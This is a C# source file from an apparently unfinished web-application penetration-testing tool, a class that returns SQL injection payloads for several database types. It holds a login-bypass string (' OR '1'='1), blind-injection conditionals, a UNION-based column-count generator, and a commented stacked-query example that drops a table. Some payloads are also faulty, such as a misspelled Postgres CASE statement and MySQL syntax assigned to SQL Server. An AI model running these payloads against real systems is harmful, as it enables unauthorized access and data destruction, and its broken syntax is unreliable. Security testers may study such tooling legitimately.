using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data;
using WebAppPenTest.Common.Models;

namespace WebAppPenTest.Domain {
    /// <summary>
    /// This class contains methods to expose various different attack vectors against
    /// several kinds of SQL databases
    /// </summary>
    public class SqlAttacks {
        public DatabaseType DatabaseType { get; set; }
        public bool UseInlineComments { get; set; }

        public SqlAttacks() {

        }
        public SqlAttacks(DatabaseType databaseType, bool useInlineComments) {
            DatabaseType = databaseType;
            UseInlineComments = useInlineComments;
        }

        public string InitialProbe() {
            return @" ' OR 1=1";
        }
        /// <summary>
        /// uses OR 1=1 to trick the login query into returning true.
        /// </summary>
        /// <returns>OR 1=1</returns>
        public string TrickLogin() {
            return @" ' OR '1'='1";
        }
        /// <summary>
        /// Tests for certain responses in order to determine version.
        /// </summary>
        /// <returns></returns>
        public string VersionCheck() {
            string version = string.Empty;

            switch (DatabaseType) { 
                case DatabaseType.MsSql:
                    break;
                case DatabaseType.Postgres:
                    break;
                case DatabaseType.MySql:
                    return MySqlVersionCheck();
                case DatabaseType.Oracle:
                    break;
                default:
                    break;
            }

            return version;
        }
        /// <summary>
        /// runs a specific query to trigger an error that only occurs if the version is higher
        /// than 3.23.02. This is specific to MySql.
        /// </summary>
        /// <returns></returns>
        private string MySqlVersionCheck() {
            //        SELECT /*!32302 1/0, */ 1 FROM tablename
            //Will throw an divison by 0 error if MySQL version is higher than3.23.02
            if (UseInlineComments) {
                return @"SELECT /*!32302 1/0, */ 1 FROM tablename";
            } else {
                return @"SELECT 1 FROM tablename";
            }
        }
        /// <summary>
        /// Get response based on a if statement.
        /// This is one of the key points of Blind SQL Injection, 
        /// also can be very useful to test simple stuff blindly and accurately.
        /// </summary>
        /// <returns></returns>
        public string TryIfStatements() {
            switch (DatabaseType) {
                case DatabaseType.MsSql:
                    return @"SELECT IF(1 = 1, 'true', 'false')";
                case DatabaseType.Postgres:
                    return @"SELECT CASE WEHEN(1=1) THEN 'A' ELSE 'B'END;";
                case DatabaseType.MySql:
                    return @"SELECT IF(1 = 1, 'true', 'false')";
                case DatabaseType.Oracle:
                    return @"BEGIN IF condition THEN true-part; ELSE false-part; END IF; END; (O) ";
                default:
                    throw new Exception("Database type not supported");
            }
        }
        /// <summary>
        /// This method will attempt to use the a UNION to determine the number of fields 
        /// data type and others depending on the DatabaseType.
        /// </summary>
        /// <param name="totalTries"></param>
        /// <returns></returns>
        public IEnumerable<string> UnionTrick(int totalTries) {
            //yield return to append values onto the UNION statement.
            //the calling loop could then catch errors and continue until it works.
            var sql = " UNION ALL SELECT ";
            var intList = new List<int>();

            for (int i = 1; i <= totalTries; i++) {
                intList.Add(i);
            }
            foreach (var item in intList) {
                string currentAttempt = "";

                if (item == 1) {
                    currentAttempt = item.ToString();
                } else if (item <= totalTries) {
                    currentAttempt = string.Concat(",", item);
                }
                yield return sql += currentAttempt;
            }
        }

        //        Stacking Queries
        //Executing more than one query in one transaction.This is very useful in every injection point, especially in SQL Server back ended applications.

        //; (S) 
        //SELECT* FROM members; DROP members--
        //Ends a query and starts a new one.

        //SELECT IF(1=1,'true','false')

        
    }
}
